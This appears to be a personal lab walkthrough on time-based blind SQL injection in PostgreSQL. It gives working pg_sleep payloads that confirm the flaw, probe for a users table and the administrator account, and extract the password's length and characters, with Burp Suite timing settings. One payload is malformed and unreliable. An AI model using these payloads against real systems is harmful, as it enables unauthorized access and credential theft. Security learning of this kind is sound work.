Unlike the regular SQL injection, it doesnt matter what
you inject, the page will load the same.

It might be vulnerable to Time based SQL injection,
This means we can try to inject a statement and see if the
page is taking longer to load. If it does, this might be because
the SQL injection is working but not displaying.

Go to a cheat sheet and search for time delay injections.
Assuming we dont know the DB version, we should try all of them.
Those commands are making the DB wait certain time before responding
or continuing.

For example in PostgreSQL
'||pg_sleep(10)--

So we should try to inject this, and if the DB is waiting 10 more
seconds then usual before responding then the SQL is vulnerable to 
injection.
This  comman will end the current input using the '
and specify another command using the ||, additionally we will add
-- at the end or # to comment out whatever is comming next.

If x=true sleep for 10 seconds.
To get the statement you can search in a cheatsheet or try the following
'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)--

To make sure it works, try to inject the code above, if the server is 
waiting 10 seconds before respopnding then its vulnerable.

This means we can insert any statement instead of 2=2 and if the statement
is true, the machine will waite 10 seconds before responding.


The next step is to check if there is a table called users for example,
All we have to do is take the previous sentence and add from users
'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--


To double check make sure each time to insert a false statement to make sure
it wont wait 10 seconds and it does actually works.
'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM uagfxadasds)--


Now we should search for a username called administrator
'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--


So how to find the password, first find the length
'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>5) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
*Continue guessing the length untill you get the exact length and then use the equall sign
'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--


Our next goal is to obtain the password
'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING,1,1='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
Instead of guessing character by character, we could use burp suite, like we have done in the other example of
blind SQL injection. BUT there is a slight diffrence. We follow the exact same steps but before sending the attack
we haveto go to the resource pool and change it to only 1 request at a time. this is because we want to monitor
the time for each response. This will make the results more accurate.

When watching the results, instead of looking at the length, we will have to look at the response receive time.
If we dont have this option, click on the columns in the top left and tick the response received option.
 
